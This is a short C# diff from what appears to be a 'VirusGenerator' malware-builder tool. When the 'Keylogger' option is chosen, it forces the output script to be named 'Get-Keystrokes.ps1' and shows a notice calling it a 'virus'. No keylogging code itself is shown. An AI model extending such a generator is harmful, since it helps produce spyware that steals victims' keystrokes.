@@ -81,7 +81,12 @@ namespace VirusGenerator
 
             if (CBoxAttack.Text == "Keylogger")
             {
-                string folderPath = _outputFolder + "Get-Keystokes";
+                MessageBox.Show("Please note that this virus will only work with the name 'Get-Keystrokes', the name will automatically be changed for you.", "NOTICE");
+
+                _fileName = "Get-Keystrokes";
+                _fileExt = ".ps1";
+
+                string folderPath = _outputFolder + "Get-Keystrokes";
                 
                 Path.Combine(folderPath, _fileName);
                 Directory.CreateDirectory(folderPath);
